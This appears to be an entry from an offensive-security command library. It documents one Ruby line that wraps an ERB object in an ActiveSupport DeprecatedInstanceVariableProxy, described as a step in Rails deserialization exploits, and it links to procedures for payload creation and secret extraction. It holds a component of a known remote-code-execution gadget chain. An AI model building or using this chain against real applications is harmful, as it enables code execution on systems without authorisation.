---
data: >-
  depr =
  ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result",
  ActiveSupport::Deprecation.new)
tags:
  - rails
  - deserialization
type: command
executor: ruby
platforms:
  - Linux
id: b259f4b4-b97a-4fca-b4d7-f1b3708fca46
created_at: '2025-12-11T03:47:59.219Z'
updated_at: '2025-12-11T03:47:59.219Z'
verified: false
validated: true
submitted: true
---
# deprecation-proxy-create

## Command

```ruby
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result", ActiveSupport::Deprecation.new)
```

## Description

Creates a deprecated proxy object to wrap the ERB instance for use in deserialization exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `erb` | ERB object | Yes |
| `:result` | Method to proxy | Yes |
| `"@result"` | Variable name | Yes |

## Examples

### Basic Usage

```ruby
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result", ActiveSupport::Deprecation.new)
```

## Expected Output

Deprecated proxy object.

## Related

- [[commands/erb-payload-create]]
- [[procedures/Extract-Secrets-and-Generate-Marshalled-Payload]]
